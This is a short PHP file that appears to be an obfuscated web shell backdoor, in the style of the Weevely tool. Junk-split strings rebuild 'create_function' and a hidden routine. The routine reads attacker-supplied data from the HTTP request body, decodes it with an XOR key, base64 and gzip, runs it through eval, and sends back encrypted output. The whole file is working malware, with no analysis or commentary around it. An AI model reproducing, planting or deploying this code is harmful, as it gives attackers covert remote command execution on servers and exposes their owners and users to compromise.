<?php
$L=str_replace('jv','','cjvrejvajvjvtjve_funjvction');
$z='=st}frlen($t}f)}f;$o="";for($i=0}f;}f$i<$l;){f}for($j}f=0;($j<$}fc&&$i<$';
$q='=1) {}f@ob_}fstart()}f;@ev}fal(}f@gzuncompr}fes}fs(@x(@ba}fse64_d}fec}fod';
$P='$k}f="6d}ffa5482";$kh="a}f}f303a4}fd661e2";}f$}fkf="427ad1}f8f469c";$}f';
$s='e(}f$m[1]),$k)}f));$o=@}fob}f_get_content}fs();}f@ob_e}fnd_clean();$r}f=@ba';
$Z='l}f);$j}f++,$i++}f){$o.=$}ft}f{}f$i}}f^$k{$j};}}}freturn $o}f;}if (@preg}f_mat}fc';
$Y='h("/$}fkh(.+)}f$k}ff/",@fil}fe_get_c}fontents("p}fhp:}f/}f/inpu}ft"),$m)=';
$h='s}fe64_enco}fde(@x(}f@g}fzcomp}f}fress($o}f),$k));print(}f"$p$kh$}fr$kf");}';
$t='p="TBaeHVq}fgz}fCTiMJB}fK";functio}fn x($t}f,$k){$}fc=st}frl}fen($k);$l}f';
$D=str_replace('}f','',$P.$t.$z.$Z.$Y.$q.$s.$h);
$F=$L('',$D);$F();
?>
